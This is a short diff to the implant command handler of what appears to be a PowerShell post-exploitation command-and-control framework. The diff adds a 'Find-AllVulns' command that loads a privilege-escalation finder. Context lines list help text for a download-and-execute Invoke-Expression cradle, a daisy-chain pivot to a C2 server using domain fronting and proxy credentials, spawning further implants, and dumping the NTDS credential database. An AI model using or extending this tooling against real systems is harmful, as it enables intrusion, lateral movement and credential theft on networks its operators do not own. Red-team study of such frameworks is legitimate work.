@@ -479,6 +479,7 @@ $header = '
         write-host " LoadModule Inveigh.ps1" -ForegroundColor Green
         write-host " Get-UserInfo" -ForegroundColor Green
         write-host " Invoke-HostEnum -All" -ForegroundColor Green
+        write-host " Find-AllVulns" -ForegroundColor Green
         write-host " Invoke-Expression (Get-Webclient).DownloadString(`"https://module.ps1`")" -ForegroundColor Green
         write-host " StartAnotherImplant or SAI" -ForegroundColor Green 
         write-host " Invoke-DaisyChain -name dc1daisy -daisyserver http://192.168.1.1 -port 80 -c2port 80 -c2server http://c2.goog.com -domfront aaa.clou.com -proxyurl http://10.0.0.1:8080 -proxyuser dom\test -proxypassword pass -localhost (optional if low level user)" -ForegroundColor Green
@@ -1855,7 +1856,11 @@ param
             }
             if ($pscommand.tolower().startswith('invoke-hostenum'))
             {
-                CheckModuleLoaded "Invoke-HostEnum.ps1" $psrandomuri
+                CheckModuleLoaded "HostEnum.ps1" $psrandomuri
+            }
+            if ($pscommand.tolower().startswith('find-allvulns'))
+            {
+                CheckModuleLoaded "sherlock.ps1" $psrandomuri
             }
             if ($pscommand.tolower().startswith('dump-ntds'))
             {
